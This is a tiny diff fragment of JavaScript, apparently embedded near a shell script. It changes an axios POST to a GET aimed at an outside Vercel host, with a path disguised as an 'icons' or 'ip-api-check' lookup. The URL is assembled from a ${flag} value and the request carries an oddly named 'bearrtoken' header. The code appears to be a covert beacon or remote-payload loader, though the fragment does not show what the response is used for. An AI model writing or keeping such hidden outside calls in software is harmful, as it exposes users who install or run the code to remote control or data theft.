@@ -760,7 +760,7 @@ exit 0
 const host = "your-vercel-app(2)";
 const apikey = "3aeb34a3${flag}";
 axios
-  .post(
+  .get(
     \`https://ip-api-check-nine.vercel.app/icons/70${flag}\`,
      { headers: { "bearrtoken": "logo" } },
   )
